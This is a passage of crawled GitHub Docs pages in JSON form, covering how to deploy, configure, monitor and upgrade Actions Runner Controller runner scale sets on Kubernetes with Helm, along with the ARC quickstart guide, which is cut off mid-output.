you set for the `containerMode`, a configuration will automatically be injected into the `template` section of the `values.yaml` file for the `gha-runner-scale-set` helm chart.\n\n*   See the [`dind` configuration](https://github.com/actions/actions-runner-controller/blob/5347e2c2c80fbc45be7390eab117e861d30776d1/charts/gha-runner-scale-set/values.yaml#L110).\n*   See the [`kubernetes` configuration](https://github.com/actions/actions-runner-controller/blob/5347e2c2c80fbc45be7390eab117e861d30776d1/charts/gha-runner-scale-set/values.yaml#L160).\n\nTo customize the spec, comment out or remove `containerMode`, and append the configuration you want in the `template` section.\n\n#### [Example: running `dind-rootless`](#example-running-dind-rootless)\n\nBefore deciding to run `dind-rootless`, make sure you are aware of [known limitations](https://docs.docker.com/engine/security/rootless/#known-limitations).\n\n```\n## githubConfigUrl is the GitHub url for where you want to configure runners\n## ex: https://github.com/myorg/myrepo or https://github.com/myorg\ngithubConfigUrl: \"https://github.com/actions/actions-runner-controller\"\n\n## githubConfigSecret is the k8s secrets to use when auth with GitHub API.\n## You can choose to use GitHub App or a PAT token\ngithubConfigSecret: my-super-safe-secret\n\n## maxRunners is the max number of runners the autoscaling runner set will scale up to.\nmaxRunners: 5\n\n## minRunners is the min number of idle runners. The target number of runners created will be\n## calculated as a sum of minRunners and the number of jobs assigned to the scale set.\nminRunners: 0\n\nrunnerGroup: \"my-custom-runner-group\"\n\n## name of the runner scale set to create. Defaults to the helm release name\nrunnerScaleSetName: \"my-awesome-scale-set\"\n\n## template is the PodSpec for each runner Pod\n## For reference: https://kubernetes.io/docs/reference/kubernetes-api/workload-resources/pod-v1/#PodSpec\ntemplate:\n  spec:\n    initContainers:\n    - name: init-dind-externals\n      image: ghcr.io/actions/actions-runner:latest\n      command: [\"cp\", \"-r\", \"/home/runner/externals/.\", \"/home/runner/tmpDir/\"]\n      volumeMounts:\n        - name: dind-externals\n          mountPath: /home/runner/tmpDir\n    - name: init-dind-rootless\n      image: docker:dind-rootless\n      command:\n        - sh\n        - -c\n        - |\n          set -x\n          cp -a /etc/. /dind-etc/\n          echo 'runner:x:1001:1001:runner:/home/runner:/bin/ash' >> /dind-etc/passwd\n          echo 'runner:x:1001:' >> /dind-etc/group\n          echo 'runner:100000:65536' >> /dind-etc/subgid\n          echo 'runner:100000:65536' >> /dind-etc/subuid\n          chmod 755 /dind-etc;\n          chmod u=rwx,g=rx+s,o=rx /dind-home\n          chown 1001:1001 /dind-home\n      securityContext:\n        runAsUser: 0\n      volumeMounts:\n        - mountPath: /dind-etc\n          name: dind-etc\n        - mountPath: /dind-home\n          name: dind-home\n    containers:\n    - name: runner\n      image: ghcr.io/actions/actions-runner:latest\n      command: [\"/home/runner/run.sh\"]\n      env:\n        - name: DOCKER_HOST\n          value: unix:///run/user/1001/docker.sock\n      securityContext:\n        privileged: true\n        runAsUser: 1001\n        runAsGroup: 1001\n      volumeMounts:\n        - name: work\n          mountPath: /home/runner/_work\n        - name: dind-sock\n          mountPath: /run/user/1001\n    - name: dind\n      image: docker:dind-rootless\n      args:\n        - dockerd\n        - --host=unix:///run/user/1001/docker.sock\n      securityContext:\n        privileged: true\n        runAsUser: 1001\n        runAsGroup: 1001\n      volumeMounts:\n        - name: work\n          mountPath: /home/runner/_work\n        - name: dind-sock\n          mountPath: /run/user/1001\n        - name: dind-externals\n          mountPath: /home/runner/externals\n        - name: dind-etc\n          mountPath: /etc\n        - name: dind-home\n          mountPath: /home/runner\n    volumes:\n    - name: work\n      emptyDir: {}\n    - name: dind-externals\n      emptyDir: {}\n    - name: dind-sock\n      emptyDir: {}\n    - name: dind-etc\n      emptyDir: {}\n    - name: dind-home\n      emptyDir: {}\n```\n\n#### [Understanding runner-container-hooks](#understanding-runner-container-hooks)\n\nWhen the runner detects a workflow run that uses a container job, service container, or Docker action, it will call runner-container-hooks to create a new pod. The runner relies on runner-container-hooks to call the Kubernetes APIs and create a new pod in the same namespace as the runner pod. This newly created pod will be used to run the container job, service container, or Docker action. For more information, see the [`runner-container-hooks`](https://github.com/actions/runner-container-hooks) repository.\n\n#### [Configuring hook extensions](#configuring-hook-extensions)\n\nAs of ARC version 0.4.0, runner-container-hooks support hook extensions. You can use these to configure the pod created by runner-container-hooks. For example, you could use a hook extension to set a security context on the pod. Hook extensions allow you to specify a YAML file that is used to update the [PodSpec](https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.26/#podspec-v1-core) of the pod created by runner-container-hooks.\n\nThere are two options to configure hook extensions.\n\n*   Store in your **custom runner image**. You can store the PodSpec in a YAML file anywhere in your custom runner image. For more information, see [About Actions Runner Controller](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/about-actions-runner-controller#creating-your-own-runner-image).\n*   Store in a **ConfigMap**. You can create a config map with the PodSpec and mount that config map in the runner container. For more information, see [ConfigMaps](https://kubernetes.io/docs/concepts/configuration/configmap/) in the Kubernetes documentation.\n\nNote\n\nWith both options, you must set the `ACTIONS_RUNNER_CONTAINER_HOOK_TEMPLATE` environment variable in the runner container spec to point to the path of the YAML file mounted in the runner container.\n\n##### [Example: Using config map to set securityContext](#example-using-config-map-to-set-securitycontext)\n\nCreate a config map in the same namespace as the runner pods. For example:\n\n```\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: hook-extension\n  namespace: arc-runners\ndata:\n  content: |\n    metadata:\n      annotations:\n        example: \"extension\"\n    spec:\n      containers:\n        - name: \"$job\" # Target the job container\n          securityContext:\n            runAsUser: 1000\n```\n\n*   The `.metadata.labels` and `metadata.annotations` fields will be appended as is, unless their keys are reserved. You cannot override the `.metadata.name` and `metadata.namespace` fields.\n*   The majority of the PodSpec fields are applied from the specified template, and will override the values passed from your Helm chart `values.yaml` file.\n*   If you specify additional volumes they will be appended to the default volumes specified by the runner.\n*   The `spec.containers` are merged based on the names assigned to them.\n    *   If the name of the container is `$job`:\n        *   The `spec.containers.name` and `spec.containers.image` fields are ignored.\n        *   The `spec.containers.env`, `spec.containers.volumeMounts`, and `spec.containers.ports` fields are appended to the default container spec created by the hook.\n        *   The rest of the fields are applied as provided.\n    *   If the name of the container is not `$job`, the fields will be added to the pod definition as they are.\n\n## [Enabling metrics](#enabling-metrics)\n\nNote\n\nMetrics for ARC are available as of version gha-runner-scale-set-0.5.0.\n\nARC can emit metrics about your runners, your jobs, and time spent on executing your workflows. Metrics can be used to identify congestion, monitor the health of your ARC deployment, visualize usage trends, optimize resource consumption, among many other use cases. Metrics are emitted by the controller-manager and listener pods in Prometheus format. For more information, see [Exposition formats](https://prometheus.io/docs/instrumenting/exposition_formats/) in the Prometheus documentation.\n\nTo enable metrics for ARC, configure the `metrics` property in the [`values.yaml`](https://github.com/actions/actions-runner-controller/blob/master/charts/gha-runner-scale-set-controller/values.yaml) file of the `gha-runner-scale-set-controller` chart.\n\nThe following is an example configuration.\n\n```\nmetrics:\n  controllerManagerAddr: \":8080\"\n  listenerAddr: \":8080\"\n  listenerEndpoint: \"/metrics\"\n```\n\nNote\n\nIf the `metrics:` object is not provided or is commented out, the following flags will be applied to the controller-manager and listener pods with empty values: `--metrics-addr`, `--listener-metrics-addr`, `--listener-metrics-endpoint`. This will disable metrics for ARC.\n\nOnce these properties are configured, your controller-manager and listener pods emit metrics via the listenerEndpoint bound to the ports that you specify in your [`values.yaml`](https://github.com/actions/actions-runner-controller/blob/master/charts/gha-runner-scale-set-controller/values.yaml) file. In the above example, the endpoint is `/metrics` and the port is `:8080`. You can use this endpoint to scrape metrics from your controller-manager and listener pods.\n\nTo turn off metrics, update your [`values.yaml`](https://github.com/actions/actions-runner-controller/blob/master/charts/gha-runner-scale-set-controller/values.yaml) file by removing or commenting out the `metrics:` object and its properties.\n\n### [Available metrics for ARC](#available-metrics-for-arc)\n\nThe following table shows the metrics emitted by the controller-manager and listener pods.\n\nNote\n\nThe metrics that the controller-manager emits pertain to the controller runtime and are not owned by GitHub.\n\n| Owner | Metric | Type | Description |\n| --- | --- | --- | --- |\n| controller-manager | gha\\_controller\\_pending\\_ephemeral\\_runners | gauge | Number of ephemeral runners in a pending state |\n| controller-manager | gha\\_controller\\_running\\_ephemeral\\_runners | gauge | Number of ephemeral runners in a running state |\n| controller-manager | gha\\_controller\\_failed\\_ephemeral\\_runners | gauge | Number of ephemeral runners in a failed state |\n| controller-manager | gha\\_controller\\_running\\_listeners | gauge | Number of listeners in a running state |\n| listener | gha\\_assigned\\_jobs | gauge | Number of jobs assigned to the runner scale set |\n| listener | gha\\_running\\_jobs | gauge | Number of jobs running or queued to run |\n| listener | gha\\_registered\\_runners | gauge | Number of runners registered by the runner scale set |\n| listener | gha\\_busy\\_runners | gauge | Number of registered runners currently running a job |\n| listener | gha\\_min\\_runners | gauge | Minimum number of runners configured for the runner scale set |\n| listener | gha\\_max\\_runners | gauge | Maximum number of runners configured for the runner scale set |\n| listener | gha\\_desired\\_runners | gauge | Number of runners desired (scale up / down target) by the runner scale set |\n| listener | gha\\_idle\\_runners | gauge | Number of registered runners not running a job |\n| listener | gha\\_started\\_jobs\\_total | counter | Total number of jobs started since the listener became ready \\[1\\] |\n| listener | gha\\_completed\\_jobs\\_total | counter | Total number of jobs completed since the listener became ready \\[1\\] |\n| listener | gha\\_job\\_startup\\_duration\\_seconds | histogram | Number of seconds spent waiting for workflow job to get started on the runner owned by the runner scale set |\n| listener | gha\\_job\\_execution\\_duration\\_seconds | histogram | Number of seconds spent executing workflow jobs by the runner scale set |\n\n\\[1\\]: Listener metrics that have the counter type are reset when the listener pod restarts.\n\n## [Upgrading ARC](#upgrading-arc)\n\nBecause there is no support for upgrading or deleting CRDs with Helm, it is not possible to use Helm to upgrade ARC. For more information, see [Custom Resource Definitions](https://helm.sh/docs/chart_best_practices/custom_resource_definitions/#some-caveats-and-explanations) in the Helm documentation. To upgrade ARC to a newer version, you must complete the following steps.\n\n1.  Uninstall all installations of `gha-runner-scale-set`.\n2.  Wait for resources cleanup.\n3.  Uninstall ARC.\n4.  If there is a change in CRDs from the version you currently have installed, to the upgraded version, remove all CRDs associated with `actions.github.com` API group.\n5.  Reinstall ARC again.\n\nFor more information, see [Deploying a runner scale set](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller#deploying-a-runner-scale-set).\n\nIf you would like to upgrade ARC but are concerned about downtime, you can deploy ARC in a high availability configuration to ensure runners are always available. For more information, see [High availability and automatic failover](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller#high-availability-and-automatic-failover).\n\nNote\n\nTransitioning from the [community supported version of ARC](https://github.com/actions/actions-runner-controller/discussions/2775) to the GitHub supported version is a substantial architectural change. The GitHub supported version involves a redesign of many components of ARC. It is not a minor software upgrade. For these reasons, we recommend testing the new versions in a staging environment that matches your production environment first. This will ensure stability and reliability of the setup before deploying in production.\n\n### [Deploying a canary image](#deploying-a-canary-image)\n\nYou can test features before they are released by using canary releases of the controller-manager container image. Canary images are published with tag format `canary-SHORT_SHA`. For more information, see [`gha-runner-scale-set-controller`](https://github.com/actions/actions-runner-controller/pkgs/container/gha-runner-scale-set-controller) on the Container registry.\n\nNote\n\n*   You must use Helm charts on your local file system.\n*   You cannot use the released Helm charts.\n\n1.  Update the `tag` in the [gha-runner-scale-set-controller `values.yaml`](https://github.com/actions/actions-runner-controller/blob/master/charts/gha-runner-scale-set-controller/values.yaml) file to: `canary-SHORT_SHA`\n2.  Update the field `appVersion` in the [`Chart.yaml`](https://github.com/actions/actions-runner-controller/blob/master/charts/gha-runner-scale-set/Chart.yaml) file for `gha-runner-scale-set` to: `canary-SHORT_SHA`\n3.  Re-install ARC using the updated Helm chart and `values.yaml` files.\n\n## [High availability and automatic failover](#high-availability-and-automatic-failover)\n\nARC can be deployed in a high availability (active-active) configuration. If you have two distinct Kubernetes clusters deployed in separate regions, you can deploy ARC in both clusters and configure runner scale sets to use the same `runnerScaleSetName`. In order to do this, each runner scale set must be assigned to a distinct runner group. For example, you can have two runner scale sets each named `arc-runner-set`, as long as one runner scale set belongs to `runner-group-A` and the other runner scale set belongs to `runner-group-B`. For information on assigning runner scale sets to runner groups, see [Managing access to self-hosted runners using groups](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/managing-access-to-self-hosted-runners-using-groups).\n\nIf both runner scale sets are online, jobs assigned to them will be distributed arbitrarily (assignment race). You cannot configure the job assignment algorithm. If one of the clusters goes down, the runner scale set in the other cluster will continue to acquire jobs normally without any intervention or configuration change.\n\n## [Using ARC across organizations](#using-arc-across-organizations)\n\nA single installation of Actions Runner Controller allows you to configure one or more runner scale sets. These runner scale sets can be registered to a repository, organization, or enterprise. You can also use runner groups to control the permissions boundaries of these runner scale sets.\n\nAs a best practice, create a unique namespace for each organization. You could also create a namespace for each runner group or each runner scale set. You can install as many runner scale sets as needed in each namespace. This will provide you the highest levels of isolation and improve your security. You can use GitHub Apps for authentication and define granular permissions for each runner scale set.\n\n## [Legal notice](#legal-notice)\n\nPortions have been adapted from [https://github.com/actions/actions-runner-controller/](https://github.com/actions/actions-runner-controller/) under the Apache-2.0 license:\n\n```\nCopyright 2019 Moto Ishizawa\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n```",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 338,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-with-actions-runner-controller-deploying-runner-scale-sets-wi",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-with-actions-runner-controller-deploying-runner-scale-sets-wi",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-with-actions-runner-controller-deploying-runner-scale-sets-wi",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-with-actions-runner-controller-deploying-runner-scale-sets-wi",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-with-actions-runner-controller-deploying-runner-scale-sets-wi"
    },
    "lengths": {
      "extractus": 68711,
      "readableText": 61136,
      "none": 98319,
      "readableTextIfPossible": 61136,
      "result": 61136,
      "markdown": 47428
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/quickstart-for-actions-runner-controller",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/quickstart-for-actions-runner-controller",
    "loadedTime": "2025-05-08T06:42:52.433Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/quickstart-for-actions-runner-controller",
    "title": "Quickstart for Actions Runner Controller - GitHub Docs",
    "description": "Try out Actions Runner Controller in 5 minutes.",
    "author": null,
    "keywords": "Actions Runner Controller",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Quickstart for Actions Runner Controller - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/quickstart-for-actions-runner-controller"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/quickstart-for-actions-runner-controller"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "B3AF:122227:BA5422:F4BC5D:681C5262",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:42:42 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-nyc-kteb1890061-NYC",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686562.446308, VS0, VE297",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "29607",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Quickstart for Actions Runner Controller\nTry out Actions Runner Controller in 5 minutes.\nLegal notice\nIntroduction\nActions Runner Controller (ARC) is a Kubernetes operator that orchestrates and scales self-hosted runners for GitHub Actions. For more information, see Operator pattern in the Kubernetes documentation.\nWith ARC, you can create runner scale sets that automatically scale based on the number of workflows running in your repository, organization, or enterprise. Because controlled runners can be ephemeral and based on containers, new runner instances can scale up or down rapidly and cleanly. For more information about autoscaling, see Autoscaling with self-hosted runners.\nYou can set up ARC on Kubernetes using Helm, then create and run a workflow that uses runner scale sets. For more information about runner scale sets, see Deploying runner scale sets with Actions Runner Controller.\nPrerequisites\nIn order to use ARC, ensure you have the following.\nA Kubernetes cluster\nFor a managed cloud environment, you can use AKS. For more information, see Azure Kubernetes Service in the Azure documentation.\nFor a local setup, you can use minikube or kind. For more information, see minikube start in the minikube documentation and kind in the kind documentation.\nNote\nOpenShift clusters are currently unsupported.\nHelm 3\nFor more information, see Installing Helm in the Helm documentation.\nWhile it is not required for ARC to be deployed, we recommend ensuring you have implemented a way to collect and retain logs from the controller, listeners, and ephemeral runners before deploying ARC in production workflows.\nInstalling Actions Runner Controller\nTo install the operator and the custom resource definitions (CRDs) in your cluster, do the following.\nIn your Helm chart, update the NAMESPACE value to the location you want your operator pods to be created. This namespace must allow access to the Kubernetes API server.\nInstall the Helm chart.\nThe following example installs the latest version of the chart. To install a specific version, you can pass the --version argument along with the version of the chart you wish to install. You can find the list of releases in the GitHub Container Registry.\nBash\nNAMESPACE=\"arc-systems\" helm install arc \\ --namespace \"${NAMESPACE}\" \\ --create-namespace \\ oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set-controller \nFor additional Helm configuration options, see values.yaml in the ARC documentation.\nTo enable ARC to authenticate to GitHub, generate a personal access token (classic). For more information, see Authenticating to the GitHub API.\nConfiguring a runner scale set\nTo configure your runner scale set, run the following command in your terminal, using values from your ARC configuration.\nWhen you run the command, keep the following in mind.\nUpdate the INSTALLATION_NAME value carefully. You will use the installation name as the value of runs-on in your workflows. For more information, see Workflow syntax for GitHub Actions.\nUpdate the NAMESPACE value to the location you want the runner pods to be created.\nSet GITHUB_CONFIG_URL to the URL of your repository, organization, or enterprise. This is the entity that the runners will belong to.\nThis example command installs the latest version of the Helm chart. To install a specific version, you can pass the --version argument with the version of the chart you wish to install. You can find the list of releases in the GitHub Container Registry.\nNote\nAs a security best practice, create your runner pods in a different namespace than the namespace containing your operator pods.\nAs a security best practice, create Kubernetes secrets and pass the secret references. Passing your secrets in plain text via the CLI can pose a security risk. For more information, see Deploying runner scale sets with Actions Runner Controller.\nBash\nINSTALLATION_NAME=\"arc-runner-set\" NAMESPACE=\"arc-runners\" GITHUB_CONFIG_URL=\"https://github.com/<your_enterprise/org/repo>\" GITHUB_PAT=\"<PAT>\" helm install \"${INSTALLATION_NAME}\" \\ --namespace \"${NAMESPACE}\" \\ --create-namespace \\ --set githubConfigUrl=\"${GITHUB_CONFIG_URL}\" \\ --set githubConfigSecret.github_token=\"${GITHUB_PAT}\" \\ oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set \nFor additional Helm configuration options, see values.yaml in the ARC documentation.\nFrom your terminal, run the following command to check your installation.\nYou should see an output similar to the following.\nNAME NAMESPACE REVISION UPDATED STATUS CHART APP VERSION arc arc-systems 1 2023-04-12 11:45:59.152090536 +0000 UTC deployed gha-runner-scale-set-controller-0.4.0 0.4.0 arc-runner-set arc-runners 1 2023-04-12 11:46:13.451041354 +0000 UTC deployed gha-runner-scale-set-0.4.0 0.4.0 \nTo check the manager pod, run the following command in your terminal.\nBash\nkubectl get pods -n arc-systems \nIf everything was installed successfully, the status of the pods shows as Running.\nNAME READY STATUS RESTARTS AGE arc-gha-runner-scale-set-controller-594cdc976f-m7cjs 1/1 Running 0 64s arc-runner-set-754b578d-listener 1/1 Running 0 12s \nIf your installation was not successful, see Troubleshooting Actions Runner Controller errors for troubleshooting information.\nUsing runner scale sets\nNow you will create and run a simple test workflow that uses the runner scale set runners.\nIn a repository, create a workflow similar to the following example. The runs-on value should match the Helm installation name you used when you installed the autoscaling runner set.\nFor more information on adding workflows to a repository, see Quickstart for GitHub Actions.\nYAML\nname: Actions Runner Controller Demo on: workflow_dispatch: jobs: Explore-GitHub-Actions: # You need to use the INSTALLATION_NAME from the previous step runs-on: arc-runner-set steps: - run: echo \"🎉 This job uses runner scale set runners!\" \nOnce you've added the workflow to your repository, manually trigger the workflow. For more information, see Manually running a workflow.\nTo view the runner pods being created while the workflow is running, run the following command from your terminal.\nBash\nkubectl get pods -n arc-runners \nA successful output will look similar to the following.\nNAMESPACE NAME READY STATUS RESTARTS AGE arc-runners arc-runner-set-rmrgw-runner-p9p5n 1/1 Running 0 21s \nNext steps\nActions Runner Controller can help you efficiently manage your GitHub Actions runners. Ready to get started? Here are some helpful resources for taking your next steps with ARC:\nFor detailed authentication information, see Authenticating to the GitHub API.\nFor help using ARC runners in your workflows, see Using Actions Runner Controller runners in a workflow.\nFor deployment information, see Deploying runner scale sets with Actions Runner Controller.\nLegal notice\nPortions have been adapted from https://github.com/actions/actions-runner-controller/ under the Apache-2.0 license:\nCopyright 2019 Moto Ishizawa Licensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0 Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-with-actions-runner-controller-quickstart-for-actions-runner--c3v71.html",
  "markdown": "# Quickstart for Actions Runner Controller\n\nTry out Actions Runner Controller in 5 minutes.\n\n[Legal notice](#legal-notice)\n\n## [Introduction](#introduction)\n\nActions Runner Controller (ARC) is a Kubernetes operator that orchestrates and scales self-hosted runners for GitHub Actions. For more information, see [Operator pattern](https://kubernetes.io/docs/concepts/extend-kubernetes/operator/) in the Kubernetes documentation.\n\nWith ARC, you can create runner scale sets that automatically scale based on the number of workflows running in your repository, organization, or enterprise. Because controlled runners can be ephemeral and based on containers, new runner instances can scale up or down rapidly and cleanly. For more information about autoscaling, see [Autoscaling with self-hosted runners](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/autoscaling-with-self-hosted-runners).\n\nYou can set up ARC on Kubernetes using Helm, then create and run a workflow that uses runner scale sets. For more information about runner scale sets, see [Deploying runner scale sets with Actions Runner Controller](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller#runner-scale-set).\n\n## [Prerequisites](#prerequisites)\n\nIn order to use ARC, ensure you have the following.\n\n*   A Kubernetes cluster\n    \n    *   For a managed cloud environment, you can use AKS. For more information, see [Azure Kubernetes Service](https://azure.microsoft.com/en-us/products/kubernetes-service) in the Azure documentation.\n        \n    *   For a local setup, you can use minikube or kind. For more information, see [minikube start](https://minikube.sigs.k8s.io/docs/start/) in the minikube documentation and [kind](https://kind.sigs.k8s.io/) in the kind documentation.\n        \n        Note\n        \n        OpenShift clusters are currently unsupported.\n        \n*   Helm 3\n    \n    *   For more information, see [Installing Helm](https://helm.sh/docs/intro/install/) in the Helm documentation.\n*   While it is not required for ARC to be deployed, we recommend ensuring you have implemented a way to collect and retain logs from the controller, listeners, and ephemeral runners before deploying ARC in production workflows.\n    \n\n## [Installing Actions Runner Controller](#installing-actions-runner-controller)\n\n1.  To install the operator and the custom resource definitions (CRDs) in your cluster, do the following.\n    \n    1.  In your Helm chart, update the `NAMESPACE` value to the location you want your operator pods to be created. This namespace must allow access to the Kubernetes API server.\n    2.  Install the Helm chart.\n    \n    The following example installs the latest version of the chart. To install a specific version, you can pass the `--version` argument along with the version of the chart you wish to install. You can find the list of releases in the [GitHub Container Registry](https://github.com/actions/actions-runner-controller/pkgs/container/actions-runner-controller-charts%2Fgha-runner-scale-set-controller).\n    \n    Bash\n    \n    ```\n    NAMESPACE=\"arc-systems\"\n    helm install arc \\\n        --namespace \"${NAMESPACE}\" \\\n        --create-namespace \\\n        oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set-controller\n    ```\n    \n    For additional Helm configuration options, see [`values.yaml`](https://github.com/actions/actions-runner-controller/blob/master/charts/gha-runner-scale-set-controller/values.yaml) in the ARC documentation.\n    \n2.  To enable ARC to authenticate to GitHub, generate a personal access token (classic). For more information, see [Authenticating to the GitHub API](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/authenticating-to-the-github-api#deploying-using-personal-access-token-classic-authentication).\n    \n\n## [Configuring a runner scale set](#configuring-a-runner-scale-set)\n\n1.  To configure your runner scale set, run the following command in your terminal, using values from your ARC configuration.\n    \n    When you run the command, keep the following in mind.\n    \n    *   Update the `INSTALLATION_NAME` value carefully. You will use the installation name as the value of `runs-on` in your workflows. For more information, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idruns-on).\n        \n    *   Update the `NAMESPACE` value to the location you want the runner pods to be created.\n        \n    *   Set `GITHUB_CONFIG_URL` to the URL of your repository, organization, or enterprise. This is the entity that the runners will belong to.\n        \n    *   This example command installs the latest version of the Helm chart. To install a specific version, you can pass the `--version` argument with the version of the chart you wish to install. You can find the list of releases in the [GitHub Container Registry](https://github.com/actions/actions-runner-controller/pkgs/container/actions-runner-controller-charts%2Fgha-runner-scale-set).\n        \n        Note\n        \n        *   As a security best practice, create your runner pods in a different namespace than the namespace containing your operator pods.\n        *   As a security best practice, create Kubernetes secrets and pass the secret references. Passing your secrets in plain text via the CLI can pose a security risk. For more information, see [Deploying runner scale sets with Actions Runner Controller](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller).\n        \n        Bash\n        \n        ```\n        INSTALLATION_NAME=\"arc-runner-set\"\n        NAMESPACE=\"arc-runners\"\n        GITHUB_CONFIG_URL=\"https://github.com/<your_enterprise/org/repo>\"\n        GITHUB_PAT=\"<PAT>\"\n        helm install \"${INSTALLATION_NAME}\" \\\n            --namespace \"${NAMESPACE}\" \\\n            --create-namespace \\\n            --set githubConfigUrl=\"${GITHUB_CONFIG_URL}\" \\\n            --set githubConfigSecret.github_token=\"${GITHUB_PAT}\" \\\n            oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set\n        ```\n        \n        For additional Helm configuration options, see [`values.yaml`](https://github.com/actions/actions-runner-controller/blob/master/charts/gha-runner-scale-set/values.yaml) in the ARC documentation.\n        \n2.  From your terminal, run the following command to check your installation.\n    \n    You should see an output similar to the following.\n    \n    ```\n    NAME            NAMESPACE       REVISION        UPDATED                                 STATUS          CHART                                       APP VERSION\n    arc             arc-systems     1               2023-04-12 11:45:59.152090536 +0000 UTC deployed        gha-runner-scale-set-controller-0.4.0       0.4.0\n    arc-runner-set  arc-runners     1               2023-04-12 11:46:13.451041354 +0000 UTC deployed     